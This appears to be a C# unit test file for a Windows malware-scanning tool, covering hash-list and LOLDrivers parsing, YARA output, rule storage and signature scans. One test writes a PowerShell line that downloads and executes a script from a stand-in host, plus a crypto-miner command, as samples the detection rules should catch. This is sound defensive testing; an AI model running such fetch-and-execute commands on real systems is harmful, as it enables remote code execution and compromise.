using Tramontana.Core;
using Tramontana.Modules.Protection;
using Tramontana.Modules.Protection.Checks;
using Tramontana.Modules.Protection.Rules;
using Severity = Tramontana.Modules.Protection.Severity;

namespace Tramontana.Tests;

public class SignatureTests
{
    [Fact]
    public void ParsesHashListsAndLolDrivers()
    {
        string b = new string('b', 64), c = new string('c', 64), d = new string('D', 64);
        var csv = "# MalwareBazaar\n" +
            $"\"2026-01-01 10:00:00\", \"{b}\", \"x\", \"y\", \"rep\", \"evil.exe\", \"exe\", \"application/x-dosexec\", \"AgentTesla\", \"n/a\", \"n/a\", \"n/a\", \"n/a\", \"n/a\"\n" +
            $"\"2026-01-02 10:00:00\", \"{c}\", \"x\", \"y\", \"rep\", \"evil2\", \"dll\", \"x\", \"n/a\", \"n/a\", \"n/a\", \"n/a\", \"n/a\", \"n/a\"\n";
        var entries = KnownHashes.Parse(csv, "bazaar.csv");
        Assert.Equal("AgentTesla", entries[b]);
        Assert.Equal("bazaar.csv", entries[c]);
        var plain = KnownHashes.Parse($"{d}  Named\n{c}\nnot a hash\n", "list.txt");
        Assert.Equal("Named", plain[d.ToLowerInvariant()]);
        Assert.Equal(2, plain.Count);

        var drivers = LolDrivers.Parse("""
        [{"Id":"1","Category":"vulnerable driver","Commands":{"Description":"Read and write kernel memory"},
          "KnownVulnerableSamples":[{"Filename":"rtcore64.sys","SHA256":"01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd"},{"Filename":"x","SHA256":""}]},
         {"Id":"2","Category":"malicious","KnownVulnerableSamples":[]}]
        """);
        Assert.Single(drivers);
        Assert.Equal("rtcore64.sys", drivers["01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd"].Filename);
        Assert.Empty(LolDrivers.Parse("{\"not\":\"a list\"}"));
    }

    [Fact]
    public void YaraOutputIsParsed()
    {
        var matches = YaraRunner.Parse("warning: rule \"x\" slows down scanning\n" +
            "Tramontana_Crypto_Miner [description=\"Stringhe tipiche dei miner\",author=\"Tramontana\",severity=\"danger\"] C:\\Users\\papa\\Downloads\\m.exe\r\n" +
            "Plain C:\\Users\\papa\\Downloads\\a b.ps1\n" +
            "Other [level=\"low\",note=\"has, comma\"] C:\\x.exe\n");
        Assert.Equal(3, matches.Count);
        Assert.Equal("Tramontana_Crypto_Miner", matches[0].Rule);
        Assert.Equal(@"C:\Users\papa\Downloads\m.exe", matches[0].File);
        Assert.Equal(Severity.Danger, matches[0].Severity);
        Assert.Equal("Stringhe tipiche dei miner", matches[0].Description);
        Assert.Equal(@"C:\Users\papa\Downloads\a b.ps1", matches[1].File);
        Assert.Equal(Severity.Danger, matches[1].Severity);
        Assert.Equal(Severity.Info, matches[2].Severity);
    }

    [Fact]
    public void RuleStoreAddsListsAndRefusesUnknownTypes()
    {
        using var temp = new TempDir();
        var store = new RuleStore(temp.Dir("rules"));
        string hashes = temp.Sub("known.txt");
        File.WriteAllText(hashes, new string('a', 64) + " Test\n");
        var added = store.Add(hashes);
        Assert.Equal("Elenco di hash", added.Kind);
        Assert.Equal(RuleStore.Sha256(hashes), added.Sha256);
        string bad = temp.File("x.bin");
        Assert.Throws<InvalidOperationException>(() => store.Add(bad));
        string notDrivers = temp.Sub("drivers.json");
        File.WriteAllText(notDrivers, "{}");
        Assert.Throws<InvalidOperationException>(() => store.Add(notDrivers));
        Assert.Single(store.Files());
        string version = store.Version();
        store.Remove(store.Files()[0]);
        Assert.Empty(store.Files());
        Assert.NotEqual(version, store.Version());
        Assert.True(File.Exists(store.BundledRules()));
        Assert.Contains("Tramontana_Crypto_Miner", File.ReadAllText(store.BundledRules()));
    }

    [Fact]
    public void ScansFoldersWithHashListAndCache()
    {
        using var temp = new TempDir();
        var store = new RuleStore(temp.Dir("rules"));
        string target = temp.Dir("target");
        string clean = temp.File(@"target\tool.exe", 64);
        File.WriteAllBytes(clean, [0x4D, 0x5A, 1, 2, 3, 4]);
        string script = temp.File(@"target\sub\run.ps1", 10);
        temp.File(@"target\notes.txt", 20); // not scannable
        string hash = RuleStore.Sha256(clean);
        string list = temp.Sub("known.txt");
        File.WriteAllText(list, hash + " FakeAV.Test\n");
        store.Add(list);
        var cache = new ScanCache(temp.Sub("cache.json"));
        // The hash list is confirmed (pinned): without the pins the scan would also warn that the files are unconfirmed.
        var pins = store.Files().ToDictionary(f => f.Name, f => f.Sha256, StringComparer.OrdinalIgnoreCase);
        var check = new SignatureScanCheck(store, cache, [target], onlyExtra: true) { Pins = pins };

        var findings = check.Run(Fake.Context()).ToList();
        var hit = Assert.Single(findings);
        Assert.Equal(Severity.Danger, hit.Severity);
        Assert.Equal(KnownPaths.Long(clean), hit.Path);
        Assert.Contains("FakeAV.Test", hit.Reason);
        Assert.Equal(FindingAction.Quarantine, hit.Action);

        var cached = cache.Load(store.Version() + "|");
        Assert.Equal(2, cached.Count); // tool.exe and run.ps1, not notes.txt
        Assert.Equal(hash, cached[KnownPaths.Long(clean)].Sha256);
        Assert.Single(check.Run(Fake.Context()));
        Assert.Empty(cache.Load("other"));
        Assert.True(ScanTargets.IsScannable(script));
        Assert.False(ScanTargets.IsScannable(temp.Sub("target", "notes.txt")));
    }

    [Fact]
    public void BundledRulesCatchADropperWhenYaraIsAvailable()
    {
        var store = new RuleStore();
        string? yara = store.YaraExecutable();
        if (yara is null) return; // yara64.exe not installed on this machine: nothing to run
        using var temp = new TempDir();
        string dropper = temp.Sub("drop.ps1");
        File.WriteAllText(dropper, "$c = New-Object Net.WebClient\nIEX $c.DownloadString('http://x.example/p.ps1')\n");
        string miner = temp.Sub("m.cmd");
        File.WriteAllText(miner, "xmrig.exe -o stratum+tcp://pool.example:3333\n");
        string fine = temp.Sub("ok.ps1");
        File.WriteAllText(fine, "Get-ChildItem C:\\\n");
        Assert.Null(YaraRunner.Validate(yara, store.BundledRules()));
        var matches = YaraRunner.Scan(yara, [store.BundledRules()], [dropper, miner, fine]);
        Assert.Contains(matches, m => m.Rule == "Tramontana_PowerShell_Dropper" && m.File.Equals(dropper, StringComparison.OrdinalIgnoreCase));
        Assert.Contains(matches, m => m.Rule == "Tramontana_Crypto_Miner" && m.File.Equals(miner, StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(matches, m => m.File.Equals(fine, StringComparison.OrdinalIgnoreCase));
        string broken = temp.Sub("broken.yar");
        File.WriteAllText(broken, "rule { nope");
        Assert.NotNull(YaraRunner.Validate(yara, broken));
    }
}
